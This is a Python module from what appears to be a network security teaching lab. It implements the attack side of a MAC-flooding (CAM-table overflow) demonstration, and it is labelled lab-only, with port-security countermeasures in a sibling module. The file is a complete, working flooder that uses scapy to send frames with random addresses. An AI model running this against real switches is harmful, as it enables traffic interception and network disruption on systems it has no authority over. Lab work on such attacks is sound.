# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-macflood: CAM-table flooding (macof-style). LAB ONLY.

Floods the switch with frames bearing random source MACs to overflow its CAM
table; a switch with no port-security then fails open and floods traffic to
every port. Port-security (see portsec.py) contains this.
"""

from __future__ import annotations

import argparse

from netlab_core import verdict
from netlab_core.sniffing import load_scapy


def run(args: argparse.Namespace) -> int:
    s = load_scapy()
    print(f"[*] flooding {args.count} random-MAC frames on {args.iface}. Ctrl-C to stop.")
    sent = 0
    try:
        for _ in range(args.count):
            pkt = (
                s.Ether(src=s.RandMAC(), dst=s.RandMAC())
                / s.IP(src=s.RandIP(), dst=s.RandIP())
                / s.UDP(sport=s.RandShort(), dport=s.RandShort())
            )
            s.sendp(pkt, iface=args.iface, verbose=0)
            sent += 1
            if sent % 1000 == 0:
                verdict("ALERT", f"{sent} bogus MACs flooded")
    except KeyboardInterrupt:
        print("\n[*] stopped.")
    verdict("ALERT", f"done: {sent} frames")
    return 0
